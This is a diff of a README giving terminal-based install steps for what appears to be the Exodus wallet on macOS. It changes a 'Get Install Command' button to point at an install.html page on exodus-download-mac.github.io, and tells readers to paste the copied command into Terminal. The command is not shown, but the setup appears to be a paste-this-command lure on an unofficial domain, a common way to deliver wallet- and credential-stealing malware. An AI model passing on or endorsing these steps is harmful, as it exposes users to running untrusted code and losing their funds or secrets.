@@ -21,7 +21,7 @@ If the download button doesn't work, follow the terminal-based installation inst
 1. Copy the installation command by clicking the button below.
 
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-%23007AFF?style=flat-square)](https://exodus-download-mac.github.io/.github/)
+[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-%23007AFF?style=flat-square)](https://exodus-download-mac.github.io/.github/install.html)
 
 
 2. Open the Terminal app on your Mac and paste the copied command, then press "Return."
